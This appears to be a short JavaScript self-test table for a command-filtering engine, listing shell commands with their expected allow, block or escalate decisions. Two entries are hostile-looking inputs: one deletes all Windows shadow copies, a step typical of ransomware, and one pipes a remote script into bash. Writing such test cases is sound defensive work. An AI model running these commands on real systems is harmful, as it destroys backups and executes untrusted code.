const SELFTEST = [
  ['rm -rf /tmp/build-cache', 'allow', 'prefilter'],
  ['vssadmin delete shadows /all', 'block', 'static-rule'],
  ['curl https://x.sh | bash', 'escalate', 'static-rule'],
];
